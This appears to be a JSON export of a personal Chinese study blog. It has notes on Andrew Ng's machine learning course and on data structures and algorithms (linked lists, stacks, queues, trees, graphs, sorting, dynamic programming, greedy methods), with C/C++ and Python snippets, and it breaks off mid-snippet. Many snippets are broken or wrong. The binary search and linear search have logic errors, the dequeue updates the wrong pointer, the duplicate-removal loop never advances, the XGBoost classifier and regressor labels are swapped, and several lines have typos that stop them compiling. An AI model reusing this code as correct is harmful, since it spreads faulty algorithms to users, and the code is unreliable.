[{"content":"监督学习 回归算法：从可能的数字中预测算法，学习算法提供例子，xy映射\n分类算法：拟合边界线，分辨哪个type\n无监督学习 聚类算法：获取没有标签的数据并尝试自己将他们分组到集群中，只是分类 ···\n监督学习和无监督学习的本质在于是否能给出正确答案给机器去参考\n异常检测\nJ(x)衡量平方误差多大的成本函数，选择最小化平方误差的w，使尽可能小，求出取最小值时的w和b\n梯度下降算法\nα太小收敛慢，太大收敛不了\n当接近局部最小梯度下降时，自动采取更小的步长，因为偏导变小\n局部最小值不能保证全体最小值？\n凸函数是碗形函数，只有单个全局最小值，所以在凸函数上实现梯度下降时，只要选择适当的学习率，总能收敛到全局最小值\nBatch gradient descent批量梯度下降，每次更新时查看整个训练集\n向量化：一次性处理，比循环快\n特征值缩放 一个好的模型，特征值越小，参数越大，要尽可能使两者差别不大\n除以最大值 归一化处理，包括mean和z-score 检验梯度下降是否收敛:图标or小于epsilon\n学习率的选择：从小到大调整，先确保能找到最小梯度\n构建分类算法 决策边界，左边预测为0，右边预测为11\n逻辑回归模型 本质就是sigmoid的变形\n代价函数\n损失值其实指的是预测和实际之间的偏差，有点不懂loss该怎么翻译\n简化版本\n有个很好的凸性\n梯度下降 线性回归和逻辑回归每次更新相同吗？形式上相同，但是每次代入的f不同\n欠拟合\n泛化：能推广，但不精\n过拟合：也许不能推广所有\n解决过拟合 选择最好的特征值\n正则化：防止特征产生影响，减少参数影响\nlamdba值决定了如何平衡，lamdba过大会欠拟合，过小会过拟合\n正则化线性回归\n正则化就是在每一次迭代中将w诚意一个稍微小于1的数字\n正则化逻辑回归\n过拟合风险很大，加上lambda一项\n神经网络 activation：一个神经元向下游的其他神经元发送高输出的程度\nlayer: affordability,awareness,perceived quality\n全连接神经网络 多隐藏层神经网络\n图像识别 输入是一个很长的向量，包括二维转换为一维，第一层寻找边缘，第二层层寻找五官，第三层寻找面部形状\n前向传播算法 Tensorflow中的数据推理 1 2 3 x=np.array([200,17]) layer1=Dense(units=3,activations=\u0026#39;sigmond\u0026#39;) a1=layer1(x) 神经网络向量化 矩阵乘法代码 TensorFlow实现 1.指定模型，告诉TensorFlow如何进行推理计算\n1 2 3 4 model=Sequential([Dense(units=25,activation=\u0026#39;sigmoid\u0026#39;) Dense(unit=15,activation=\u0026#39;sigmoid\u0026#39;) Dense(unit=1,activation=\u0026#39;sigmoid\u0026#39;) ] 2.使用特定的损失函数编译模型\n使用平方还是绝对值\n1 2 model.compile(loss=BinaryCrossentropy()) model.compile(loss=MeanSquaredError()) 3.训练模型\n1 model.fit(X,y,epochs=100) sigmoid函数的替代品 取决于预测标签Y是什么\n在隐藏层更多使用ReLU因为速度更快\n1 Dense(units=25,activation=\u0026#39;relu\u0026#39;) 为什么需要使用激活函数，或者为什么不直接使用线性函数？ hidden layer使用线性，output layer使用逻辑回归，结果是逻辑回归，如果都用线性函数，最终得到的也只是线性函数，不能得到更复杂的特性\n多类 当要识别的不仅仅是0或1\nsoftmax回归算法 逻辑回归算法的推广\n当n=2时，就是逻辑回归模型\n损失函数\n多标签分类 方法一：构建三个独立的神经网络\n方法二：训练一个神经网络同时检测所有三种情况\n优化方法 Adam算法:自动调整学习率\n1 model.compile(optimizer=tf.keras.optimaizers.Adam(learning_rate=le-3),......) Additional Layer Types Dense layer：每个层中的神经元都将前一层的所有激活作为输入\nConvolutional Layer:每个神经元只能看到部分前一层的输入。好处：更快计算，更少训练数据导致更少的过拟合\n模型评估 70%训练集：训练模型参数\n30%测试集\n如何解决低于泛化误差的实际估计 将数据集分为三个子集：60%训练集，20%测试集，20%交叉验证集：使用这个额外的数据集来交叉检查有效性\n查看哪个模型有最低的交叉验证误差\n诊断偏差和方差 High bias\nJust right\nHigh variance\nlambda越大，wj越小，拟合效果越不好\n建立表现标准 人类表现水平\n是否有一些竞争算法\n一要观察标准和训练误差差值（偏差），二要看训练误差和交叉验证误差差别（方差）\n如果一个学习算法有高偏差，增加更多的训练数据本身也无法降低出错率\n此时增加训练集可能会有帮助\n解决高方差/偏差方法 高方差：获取更多训练数据或者简化模型（使用哦个更小的特征，增加正则化参数lambda）\n高偏差：给模型更多灵活性，适应更复杂情况\nBigger network是指更多训练单元units\n迁移学习 detect edges-\u0026gt;corners-\u0026gt;curves/basic shapes\n决策树模型 1.如何选择哪个特征进行分割？\n最大化纯度\n2.什么时候停止划分？\n达到某个阙值，或大于树的深度\n测量纯度 使用熵函数\n当熵值最小时，纯度最高，最大时，纯度最小\n实际函数\n选择拆分信息增益(熵的减少) 取左右平均的加权平均\nH(0.5)-加权平均就是信息增益，如果熵的减少太小，低于一个阙值，就不再进行分裂\n为什么使用热编码？ 把特征转换为数值，超过两个离散值的特征值，热编码把这三类之间视作是平等的\n回归树和决策树区别？ 决策树用方差而不是熵函数\n使用单个决策树缺点：对微小的变化高度敏感\n神经网络更像是数学家的思路，决策树就像是程序员的思路\n随机森林算法 每次放回抽样得到不一样的训练集，新的训练集训练出若干的决策树，并且最终的预测结果是基于森林的投票结果进行（每个节点特征随机化）\n如何减少过拟合问题 从n个特征中选一个包含k个特征的子集\nXGBoost算法 不是有放回的抽样，为不同训练样本分配不同权重\n回归 1 2 3 4 from xgboost import XGBClassifier model=XGBClassifier() mdoel.fit(X_train,y_train) y_pred=model.predict(X_test) 分类 1 2 3 4 from xgboost import XGBRegressor model=XGBRegressor() model.fit(X_train,y_train) y_pred=model.predict(X_test) 无监督学习 在无监督学习下，得到的数据集只有x没有标签y\nClustring聚类算法 K-menas算法 选择两个簇，初步猜测簇质心的位置，遍历每个点，分配到离簇中心更近的位置\n移动簇中心，到红点的中心位置\n再次检查，重复上述过程，簇中心位置不断变化，直到收敛\n","date":"2025-04-23T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E5%90%B4%E6%81%A9%E8%BE%BE%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/","title":"吴恩达机器学习"},{"content":"逻辑结构：线性结构，树形结构，图形结构\n线性数据结构：线性数据结构是指数据元素之间存在一对一的线性关系的数据结构。常见的线性数据结构包括数组、广义表，链表、栈和队列\n存储结构：顺序结构（开辟连续空间，通过地址），链式存储（指针域存放下一个地址，不连续），散列存储，索引存储\n顺序表 连续顺序存储，可以快速定位，但是插入和删除需要移动大量元素\n创建，取值，插入，删除（暂存）\n（略）\n链式 单链表：数据域，指针域 创建：头插法，尾插法\n1 2 3 L-\u0026gt;next =s-\u0026gt;next; L-\u0026gt;next = s; 查找：定义一个指针p，比较p-\u0026gt;data =e\n删除：实际上就是把这个节点(i)跳过去，找到第i-1个节点\n1 2 3 4 5 6 7 8 9 10 while((p-\u0026gt;next)\u0026amp;\u0026amp;(j\u0026lt;i-1)){ p=p-\u0026gt;next; j++; } q=p-\u0026gt;next;//暂时保存节点 p-\u0026gt;next=q-\u0026gt;next; delete q; 双向链表：两个指针域 插入：前后两个方向操作\n1 2 3 4 5 6 //p的前驱 p-\u0026gt;prior p-\u0026gt;prior-\u0026gt;next =s; s-\u0026gt;prior=p-\u0026gt;prior; s-\u0026gt;next=p; p-\u0026gt;prior=s; 先处理p-\u0026gt;prior和s的链接，再处理p和s的链接\n线性表的应用 合并有序顺序表，将两个有序顺序表La和Lb合并为一个新的有序顺序表 创建Lc，从两个顺序表中选择较小的数据放入Lc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 void mergelist(sqlist la,sqlist lb,sqlist \u0026amp;lc){ int i,j,k; i=j=k=0; lc.length=la.length+lb.length; lc.element = new int[lc.length]; } while(i\u0026lt;la.length\u0026amp;\u0026amp;j\u0026lt;lb.length){ if(la.elem[i]\u0026lt;lb.elem[j]){ lc.elem[k++]=la.elem[i++]; }else{ lc.elem[k++]=lb.elem[j++]; } } while(i\u0026lt;la.length){ lc.elem[k++]=la.elem[i++]; } while(j\u0026lt;lb.length){ lc.elem[k++]=lb.elem[j++]; } 合并有序链表：不需要开辟新空间，穿针引线,p,q指向链表的第一个节点,r指向尾部 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 void mergelinklist(linklist la,linklist,lb,linklist\u0026amp; lc){ linklist p,q,r; p=la-\u0026gt;next; q=lb-\u0026gt;next; lc=la; r=lc;//r指向lc的尾部 while(p\u0026amp;\u0026amp;q){ if(p-\u0026gt;data \u0026lt;= q-\u0026gt;data){ r-\u0026gt;next =p; r=p; p=p-\u0026gt;next; }else{ r-\u0026gt;next=q; r=q; q=q-\u0026gt;next; } } r-\u0026gt;next = p?p:q; } 就地逆置单链表 断开指针，记录断点，插入\n1 2 3 4 5 6 7 8 9 10 11 void reverselinklist(linklist\u0026amp; l){ linklist p,q; p=l-\u0026gt;next; l-\u0026gt;next=null; while(p){ q=p-\u0026gt;next; p-\u0026gt;next=l-\u0026gt;next; l-\u0026gt;next=p; p=q; } } 查找链表的中间节点 快指针走两步，慢指针走一步，这样，快指针走到空时，慢指针正好走到中间\n1 2 3 4 5 6 7 8 9 10 Linklist findmiddle(Linklist L){ Linklist p,q; p=l;//p为快指针，指向L q=l;//q为慢指针 while(p !=nullptr \u0026amp;\u0026amp; p-\u0026gt;next!=next){ p=p-\u0026gt;next-\u0026gt;next; q=q-\u0026gt;next; } return q; } 删除链表中的重复元素 设置一个辅助数组，用1或0标注数据是否出现\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 void delerep(linklist\u0026amp; l){ linklist p,q; int x; int* flag = new int[n+1]; for(int i=0;i\u0026lt;=n;i++) flag[i]=0; p=l;//指向头结点 while(p-\u0026gt;next!=null){ x=abs(p-\u0026gt;next-\u0026gt;data); flag[x]++; } if(flag[x]=0){ p=p-\u0026gt;next; }else{//删除操作 q=p-\u0026gt;next; p-\u0026gt;next=q-\u0026gt;next; delete q; } } 栈 顺序栈 初始化 base指向栈底，top指向栈顶\n动态分配\n1 2 3 4 5 typedef struct stack{ elemtype *base; elemtype *top; }stack #define maxsize 静态分配\n1 2 3 4 typedef struct stack{ elemtype data[maxsize]; int top; }stack 入栈 判断栈是否满，如果栈满，入栈是啊比，否则放入栈顶，栈顶指针向上移动一个位置\n出栈 判断栈是否空，如果空，出栈失败，否则将栈顶元素暂存给一个变量，栈顶指针向下移动\n取栈顶元素 不动栈顶指针，只是把栈顶元素复制一份\n链栈 把链栈看作一个不带头节点的单链表，只能在头部操作，只需要一个栈顶指针\n入栈 生成新的节点，修改栈顶指针指向新节点\n1 2 3 4 P=new Snode; p-\u0026gt;data =e;//将e存入新节点数据域 p-\u0026gt;next=S;//S指向的是旧的头节点地址域 S=p;//修改新栈顶指针为p 出栈 删除栈顶元素，让栈顶指针指向下一个节点\n1 2 3 4 e=S-\u0026gt;data;//保存栈顶元素 p=S;//保存栈顶元素地址 S=S-\u0026gt;next;修改栈顶指针 Delete p; 取栈顶元素 把栈顶元素复制一遍\n1 return S-\u0026gt;data; 队列 进的一端称为队尾，出的一段称为队头\n顺序队列 1 2 3 4 5 typedef struct sqQueue{ Elemtype *base; int front,rear; }sqQueue #define maxsize 100 入队列 1 2 Q.base[Q.rear]=x; Q.rear++; 出队列 1 2 e=Q.base[Q.front]; Q.rear++; 循环队列 判断队空？只要Q.rear和Q.front指向同一个位置\n判断队满？当Q.rea的下一个位置是Q.front，（Q.rear+1）%Maxsize = Q.front\n入队 将元素放入Q.rear所指空间，然后Q.rear后移一位\n1 2 Q.base[Q.rear]=x; Q.rear=(Q.rear+1)%MaxSize; 出队 先用变量保存队头元素，然后队头Q.front后移一位\n1 2 e=Q.base[Q.front]; Q.front=(Q.front+1)%MaxSize; 链队列 入队 先创建新结点并且将数据插入到data域\n1 2 3 4 p=new Node; p-\u0026gt;data=e Q.rear-\u0026gt;next = S; Q.raer=S;//移动 出队 相当于删除第一个数据元素，将第一个数据元素结点跳过去，p指针指向第一个数据节点\n1 Q.front-\u0026gt;next=p-\u0026gt;next; 栈的应用 数制的转换，将一个十进制数转换成一个二进制数 思路：辗转相除法\n1 2 3 4 5 6 7 8 Initstack(s);//初始化一个栈 while(n){ s.push(n%2);//余数入栈 n=n/2; } while(n!=empty){ s.pop(); } 判断回文字符串 初始化栈S，求字符串长度，把前一半字符放入到栈中，再取出来与后半部分比较是否相同，注意奇书偶数的处理，如果是奇数，先要把中间的字符取出来\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 bool palimarome(char* str){ sqstack s; int len,i; char e; len=strlen(str); Initstack(s);//初始化栈 for(i=0;i\u0026lt;len/2;i++){ s.push(str[i]); if(len%2 == 1) i=i+1; while(!empty(s)){ pop(s,e); } if(e!=str[i]) {return False;} else {i=i+1;} return True; } } 串 存储方式 顺序存储 1.以‘\\0’表示字符串长度，不算字符串长度，但是占空间\n2.在0空间存储字符串长度，下标为0的空间存储字符串长度\n3.结构体变量存储字符串长度\n静态\n1 2 3 4 Typedef struct{ char ch[Maxsize]; int length; }String 动态\n1 2 3 4 Typedef struct{ char *ch; int length; }String 链式存储 改进，一个节点存储多个字符\n串的模式匹配算法 求字串在主串的位置(BF)，T在S中的位置\n从S的第一个字符开始，T的第一个字符开始，i=1，j=1,i++,j++，如果遇到不匹配，i回退到i-j+2，j回退到1，重新开始匹配，如果匹配成功，则返回字串T在主串S中第一个字符出现的位置\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int Index_BF(String S,String T,int pos){ int i=pos,j=1,sum=0; while(i\u0026lt;=s[0]\u0026amp;\u0026amp;j\u0026lt;=T[0]){ sum+=1; if(s[i]=s[j]){ j+=1; i+=1; }else{ i=i-j+2; j=1; } if(j\u0026gt;T[0]) return i-T[0]; else return 0; } } 树 注意定义，体现递归的思想：有且仅有一个称为根的节点，除根节点以外，其余节点可分为m个互不相交的有限集T1,T2,T3,T4\u0026hellip;\u0026hellip;，其中每一个集合本身又是一棵树，称为根的子树\n度与节点的关系：结点的个数=总度数+1\n存储方式 顺序存储 双亲表示法：每个节点有两个域，数据域data和双亲域parent\n孩子表示法：除了存储数据元素之外，还存储所有孩子的存储位置下标\n双亲孩子表示法：存储双亲和所有孩子的存储位置下标\n链式存储 孩子表示法：\n孩子兄弟表示法：二叉链表，节点除了存储数据元素之外，还有两个指针域lchild和rchild，lchild存储第一个孩子地址，rchild存储右兄弟地址\n二叉树 有且仅有一个称为根的节点，除根节点以外，其余节点分为两个互不相交的子集T1,T2\n最多有两个子树\n满二叉树\n完全二叉树\n二叉树的性质\nQA1：第i层最多有几个节点？\nQA2：深度为k的二叉树最多有多少个节点？2^k-1\nQA3：叶子数（2^n）和度为2的节点数(2^0+2^1+2^2+2^3\u0026hellip;\u0026hellip;+2^n-1)的关系？\n二叉树的遍历 先序遍历DLR 1 2 3 4 5 6 7 void preorder(Btree){ if(T){ cout\u0026lt;\u0026lt;T-\u0026gt;data\u0026lt;\u0026lt;\u0026#34; \u0026#34;; preorder(T-\u0026gt;lchild); preorder(T-\u0026gt;rchild); } } 中序遍历LDR\n后序遍历LRD\n层次遍历\n树和森林及其应用 树转二叉树：长子作为左孩子，兄弟关系向右倾斜\n森林转树：把每棵树跟看作兄弟\n哈夫曼树\n构造一棵二叉树，若该树的带权路径长度达到最小，成这样的二叉树为最优二叉树，即哈夫曼树，权值较大的节点离根很近\n树的带权路径长度：树中所有叶节点的带权路径长度之和\n哈夫曼编码：左边标0，右边标1\n二叉排序树：左\u0026lt;中\u0026lt;右\n图的概念和存储结构 G=\u0026lt;V,E\u0026gt;顶点，边集\n无向图\n有向图：每条胡都是有序对，\u0026lt;V1,V3\u0026gt;从顶点v1指向顶点v3，v1弧尾，v3弧头\n简单图：既不含平行边也不含环的图\n完全图：任意两个点都有一条边；若任意两个点都有两条方向相反的弧，则该图为有向完全图\n顶点的度：指与该顶点相关联的边的数目\n握手定理：度数之和等于边数的两倍\n子图：1=\u0026lt;V1,E1\u0026gt;，V1包含于V，E1包含于E\n生成子图：从图中选择所有顶点，若干条边构成的图\n邻接矩阵：表示顶点之间关系。先要用一个一维数组把所有顶点保存下来。如果vi到vj有边，则邻接矩阵M[i] [j]=M[j] [i]=1，否则为0。so，无向图的邻接矩阵应该是对称的。有向图中，第i行元素之和就是顶点i的出度，第i列元素之和就是顶点i的入度（散度）\n邻接表：链式存储方式\n邻接表和邻接矩阵的区别和优缺点\n图的遍历和应用 BFS:先被访问的顶点，其邻接点先被访问\nDFS：无法行进时，回退到刚刚访问的节点。后被访问的节点，其邻接点先被访问\nDijkstra最短路径\n最小生成树——prim：需要n-1条边保证图连通不含回路，且要权值最小\n最小生成树——kruskal：按权值从小到大排序连接，其中不能生成回路\n拓扑排序：先选一个入度为零的节点，开始排序，删除，在删除后再找入度为零的，排序，删除\u0026hellip;\u0026hellip;\nAOE网：弧上的权值表示活动持续的时间，从源点到汇点的带权路径长度最大的路径称为关键路径，关键路径上的活动称为关键活动\n查找 顺序查找 1 2 3 4 5 6 7 int sqsearch(int r[],int n,int x){ for(int i=0;i\u0026lt;=n;i++){ if(r[i]==x){ return i; }else{return -1;} } } 二分/折半查找 非递归算法\n1 2 3 4 5 6 7 8 9 10 int BinarySearch(int s[],int n,int x){ int low=0,high=n-1; while(low\u0026lt;=high){ int middle=(high+low)/2; if(x==s[middle]) return middle; else if(x\u0026gt;s[middle]) low=middle+1; else high=middle1; } return 0; } 递归算法\n1 2 3 4 5 6 7 int recursion(int s[],int x,int low,high){ if(low\u0026gt;high) return -1; int middle=(low+high)/2; if(x=s[middle]) return middle; else if(x\u0026lt;s[middle]) return recursion(s,x,low,middle-1); else return recursion(s,c,middle+1,high); } 二叉查找树 前提：线性表必须是有序的\n1 2 3 4 5 BsTree searchBST(BsTree T,ElemType key){ if((!T)||key=T-\u0026gt;data) return T; else if(key\u0026lt;T-\u0026gt;data ) return searchBST(T-\u0026gt;lchild,key); else return searchBST(T-\u0026gt;rchild,key); } 二叉查找树的插入：小的放左边，大的放右边\n二叉查找树的删除\n平衡二叉树（AVL树）：1.左右子树高度差（平衡因子）的绝对值不超过1，2.左右子树也是平衡二叉树 插入操作，调整平衡四种（结合图）\n1.LL型：最近不平衡节点到新节点的路径前两个都是左子树L。LL旋转\n2.RR型\n3.LR型：两次旋转。从下往上第一个不平衡节点逆时针旋转，调整成LL型，第二个节点LL旋转\n4.RR型：先顺时针后RR旋转\n创建操作：按序调整，再调整平衡\n哈希表 哈希函数：散列函数，将关键字一ing射到存储地址的函数，hash(key)=Addr\n设计散列函数原则:1.尽可能简单，能快速找到 2.均匀分布整个地址，避免聚集，减少冲突\n设计哈希函数\n1.直接定址法 hash(key)=a*key+b\n2.除留余数法 hash(key)=key%p\n处理冲突：1.开放地址法：再线性存储空间上探测其他地址（通常往后移）2.链地址法\n排序 有序性\n稳定性：关键字相同时（比如出现两个2），在排序前后，这两个关键字相对位置在排序后是否发生变化\n内部排序：\n插入排序 1.直接插入，把第一个元素看作有序序列，将之后的元素插入已经排好序的序列中，保持有序性\n例：非递减排序\n时间复杂度\n最好：O(n)\n最坏：O(n^2)\n1 2 3 4 5 6 7 8 9 void straightInsert(int r[],int n){ int i,j; for(int i=2;i\u0026lt;=n;i++){ if(r[i]\u0026lt;r[i-1]){r[o]=r[i];//放到第一个位置 r[i]=r[i-1]；//往后移动一位 for(j=i-2;;j--) {if(r[j]\u0026gt;r[0]) {r[j+1]=r[j];} else{r[j+1]=r[0];}} } } 2.希尔排序（缩小增量排序）\n不稳定\n将待排序记录按下标一定增量分组，对每组记录使用直接插入排序\n交换排序：比较，不满足次序要求是交换位置 冒泡排序：两两比较，逆序则交换位置\n稳定\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 void Bubblesort(int r[],int n){ int i=n-1,temp; bool flag=true; while(i\u0026gt;=\u0026amp;\u0026amp;flag){ flag= false; for(int j=0;j\u0026lt;i;i++){ if(r[j]\u0026gt;r[j+1]){ flag=true; temp=r[j]; r[j]=r[j+1]; r[j+1]=temp; }i--; } } } 快速排序：目前最快的排序算法\n1 2 3 4 5 6 7 8 9 10 11 12 int partition(int r[],int low,int high){ int i=low.j=high,point=r[low]; while(i\u0026lt;j){ while(r[j]\u0026gt;point){ j--; } if(i\u0026lt;j) swap(r[i++],r[j]); while(r[i]\u0026lt;point) i++; if(i\u0026lt;j) swap(r[i],r[j--];) } return i; } 选择排序 简单选择排序：每次选一个最小的放在最前面\n1 2 3 4 5 6 7 8 9 10 11 12 void simpleselect(int r[],int n){ int i,j,temp; for(i=0;i\u0026lt;n-1;i++){ k=i; for(j=i+1;j\u0026lt;n;j++){ if(r[j]\u0026lt;r[k]){ k=j;//记录最小节点} if(k!=i){temp=r[i];//交换 r[i]=r[k]; r[k]=temp;} } } } 堆排序 最大堆：如果每个节点大于等于左右子树\n最小堆：如果每个节点小于等于左右子树\n步骤：1.构建初始堆 2.堆顶和最后一个记录r[n]交换，把r[1,\u0026hellip;.,n]调整为堆 3.堆顶和最后一个交换，即r[n-1]，将r[1,\u0026hellip;..,n-2]重新调整为堆 4.循环n-1次，得到一个有序序列\n1 2 3 4 5 6 7 8 9 /*k是当前节点，j是左子树*/ void smk(int k,int n){ while(x*k\u0026lt;=n){//最后一层不用比较 int j=2*k; if(j\u0026lt;n) j++； if(r[k]\u0026gt;r[j]) break; else swap(r[k],r[j])；k=j;//下一个节点是左子树 } } 归并排序 桶排序\n将待排序序列划分为若干个区间，每个区间可形象的看作一个桶，如果桶中的记录多余一个则使用较快的排序方法（可以选择），最后合并\n注意：桶排序划分应该按照数据分布\n基数排序\n求出最大关键字的位数d，从低位开始，按个位分配，桶内排序，合并，按十位分配，桶内排序，合并\u0026hellip;\u0026hellip;.直到最高位\n分配\n外部排序：数据很大，内存不能一次容纳全部的排序记录，需要访问外存。排序前后数据在外存，排序时将数据调入内存\n如何判断一个算法的优劣性？ 时间，空间\n特点：有穷性，确定性，可行性，输入，输出\n影响时间复杂性的因素：问题规模，输入序列，算法本身\n渐进上界O：T(n)=O(f(n))\n渐进下界Ω：T(n)=Ω(f(n))\n渐进精确界记号Θ：c1f(n)\u0026lt;=T(n)\u0026lt;=c2f(n),T(n)=Θf(n)\n分治算法 将一个规模为n的问题分解成k个规模较小的子问题\n分解，递归，合并\n主方法：T(n)=aT(n/b)+f(n) 时间复杂度：O(n^logb(a))\n大整数乘法\n给定两个都是2^k的大整数A，B，求A与B的乘积\n推广：用分治法求两个十进制都是n位的A与B的乘积\n优化前：T(n)=4*T(n/2)+O(n) O(n^2)\n优化后：T(n)=3*T(n/2)+O(N) O(n^log2(3))\nStassen矩阵乘法 给定矩阵A和B，均为n阶矩阵，n=2^k，求A*B\n已知矩阵A和B，均为4阶矩阵，求A*B\n划分矩阵:进行8次乘法，8个子问题\n分解：将n阶矩阵，分成n/2矩阵\n合并：赋值\n优化前：T(n)=8T(n/2)+O(n^2) 时间复杂度：O（n^3）\n优化后：T(n)=7T(n/2)+O(n^2)\n二分法 log(n)\n代码思路：1.中间值2.查找失败条件，low\u0026gt;high，返回0 3.查找成功key = 元素，返回mid+1 4.不然key\u0026lt;当前关键字，递归函数到low至mid-1中查找k 5.key\u0026gt;当前元素，递归函数到mid+1到high中查找\n归并排序 T(n)=2T(n/2)+O(n)\n时间复杂度：O(nlog(n))\n分解：分为两个大小尽量相同的子序列（前提保证这两个子序列有序）\n递归：用归并排序法对两个子序列递归地排序\n合并：将排好序地有序子序列合并\n代码思路：创建临时序列，双指针，依次比较前后子序列中关键字，将较小值依次复制到临时序列中，比较循环阶数后将前后子序列中剩余关键字（如果有剩余说明两个子序列长度不同）依次复制到临时序列中，再将临时序列是复制到原序列中，并释放原序列\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 //伪代码 int i=low,j=mid+1,k=0;//k是临时序列指针 while(i\u0026lt;=mid\u0026amp;\u0026amp;j\u0026lt;=high)//归并循环 if(R[i].key\u0026lt;=R[j].key){ R1[k]=R[i]; i++; j++ }else{ R1[k]=R[j]; i++; k++; } while(i\u0026lt;=mid){//复制剩余 R1[k]=R[i]; i++; k++; } while(j\u0026lt;=high){ R1[k]=R1[j]; j++; k++; } for(k=0,i=low;i\u0026lt;=high;k++,i++){//重置i R[i]=R1[k]; } 快速排序 最好时间复杂度O(nlog(n))\n最坏时间复杂度O(n^2)\n平均时间复杂度O(nlog(n))\n开始时将序列首元素定位基准，通过快速排序将表一分为二，关键字小于基准值放左边，大于基准值放右边(双指针)\n最好的情况：每次循环基准值最终都能落在队中间的位置\n代码思路：先用j从后往前找小于基准值的元素，将该元素前置，再用i从前往后找大于基准值的元素，将该元素后置，重复上述循环直到i=j位置，每次循环线移动j再移动i\n1 2 3 4 5 6 7 8 9 int i=s,j=t,RecType tmp=R[i];//i从队首向后遍历，j从队尾向前遍历，将首元素设置位基准值 while(i\u0026lt;j){ while(i\u0026lt;j\u0026amp;\u0026amp;R[j].key\u0026gt;=tmp.key) j--; R[i]=R[j]; while(i\u0026lt;j\u0026amp;\u0026amp;R[i].key\u0026lt;=tmp.key) i++; R[j]=R[i]; } R[i]=tmp;//i=j,循环结束，重置基准值的位置 return i; 循环赛日程表 分解前：1个n阶表格，分解后，4个n/2阶表格\nT(n)=2T(n/2)+f(n)\n1 2 3 4 5 6 7 8 int GameTable(int n,int k){ if(n==2){ a[k][0]=k+1; a[k][1]=k+2; a[k+1][0]=k+2; a[k+1][1]=k+1; } } 动态规划 求解以时间划分阶段地动态规划的优化问题，经分解得到各个子问题不是相互独立的\n三要素：最优子结构性质（有总体最优才有局部最优），子问题重叠性质，自底向上的求解方式\n矩阵连乘 静态：穷举法/动态规划\nA1A2矩阵相乘次数=A1行数*A1列数 *A2行数\n1个矩阵连乘0种划分方式\n2个矩阵连乘1种划分方式\n3个矩阵连乘2种划分方式\n最优质递归关系是:m[i] [j]=min{m[i] [k]+m[k+1] [j]+p(i-1)pkpj},i\u0026lt;j\n自底向上求解\n1.写出连乘矩阵\n2.按顺序切割矩阵\n3.算左右最少次数，合并最少次数，一共最少刺少\n4.选择最少连乘次数\nMatrixChain\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /*一维数组p记录了矩阵的行列，n是总问题规模，二维数组m记录子问题的最少连乘次数，二维数组s激素子问题的最佳分割位置*/ void MatrixChain(int *p,int n,int **m,int *S){ for(int i=1;i\u0026lt;=n;i++){ m[i][j]=0; for(int r=2;r\u0026lt;=n;r++){ for(int i=1;i\u0026lt;=n-r+1;i++){ int j=i+r-1; m[i][j]=m[i+1][j]+p[i-1]*p[i]*p[j]; s[i][j]=i; for(int k=i+1;k\u0026lt;j;k++){ int t =m[i][k]+m[k+1][j]+p[i-1]*p[k]*p[j]; if(t\u0026lt;m[i][j]){ m[i][j]=t; s[i][j]=k; } } } } } } 最长公共子序列 假设序列A长度为m，序列B长度为n，则时间消耗为O(mn)\n定理：LCS最优子结构性质\n两个序列的最长个公共子序列包含了这两个序列的前缀的最长公共子序列，因此具有最优子结构性质\n递归方程\nc[i] [j]={0 ,当i=0或j=0时；\nc[i-1] [j-1]+1，当xi=yi时；\nmax(c[i] [j-1],c[i-1] [j],当xi!=yi时；)\n}\n分解子问题（填表）\n自底向上计算LCS长度\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 void LCSlength(int m,int n,char *x,char *y,int **c,Type **b){ int i,j; for(i=0;i\u0026lt;=m;i++) c[i][0]=0; for(j=0;j\u0026lt;=n;j++) c[0][j]=0;//第一行，第一列都填0 for(i=0，i\u0026lt;=m;i++) for(j=1;j\u0026lt;=n;j++){ if(x[i]=y[j]){ c[i][j]=c[i-1][j-1]+1; b[i][j]=\u0026#34;左上\u0026#34;; } else if(c[i-1][j]\u0026gt;=c[i][j-1]){ c[i][j]=c[i-1][j]; b[i][j]=\u0026#34;上\u0026#34;; }else{ c[i][j]=c[i][j-1]; b[i][j]=\u0026#34;左\u0026#34;; } } } 构造最长公共子序列\n1 2 3 4 5 6 7 8 void LCS(int i,int j,char* x,Type **b){ if((i==0)||(j==0)) return ; if(b[i][j]==\u0026#34;左上\u0026#34;){ LCS(i-1,j-1,x,b); cout\u0026lt;\u0026lt;x[i]; }else if(b[i][j]=\u0026#34;上\u0026#34;) LCS(i-1,j,x,b); else LCS(i,j-1,x,b); } 贪心算法 初始解-\u0026gt;当前最优-\u0026gt;不能前进，终止\n特点：不允许回溯，逐步，不稳定（有时无法求得最优解）\n步骤：分解，局部最优，合并，证明\n以局部最优解达到全局最优解\n背包问题 描述：\u0026hellip;\u0026hellip;.物品可以分割\n按价值/重量最大的先装，降序排序\n物品完全装入背包条件：背包剩余重量\u0026gt;某个物品重量\n当甚于物品都无法完全装入背包时，考虑堆价值/重量较大的物品进行分割，尽量装满背包为止\n时间复杂度 对物品放入背包操作，时间消耗O(n)\n对价值/重量降序排序，默认使用堆排序，O(nlogn)\n总时间消耗O(nlogn)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 //假设已将各种物品依其单位重量的价值vi/wi从大到小排序了 void Knapsack(int n,float v[],float w[],float x[],float \u0026amp;value){ float value =0; for(int i=1;i\u0026lt;=n;i++) x[i]=0; for(int i1;i\u0026lt;=n\u0026amp;\u0026amp;w[i]\u0026lt;=c;i++){ x[i]==1; c-=w[i];//减少背包能装下的余下重量 value+=v[i];//累计总价值 } if(i\u0026lt;=n){ x[i]=c/w[i];//将剩下的一部分装入 value+=x[i]*v[i]; } } 会场安排问题 同一时间只能有一个活动使用资源，要求尽可能选择更多的活动来使用资源\n用什么标准去安排？\n开始时间最早\n持续时间最短\n结束时间最早\n步骤\n分解：按结束时间升序排序\n解决：活动被安排，安排条件：下一个活动的开始时间晚于或等于前一个活动结束时间\n时间复杂度：选择活动O(n)，对活动结束升序，堆排序，O(nlogn)\n1 2 3 4 5 6 7 8 9 10 void GreedySelector(int n,Type s[],Type 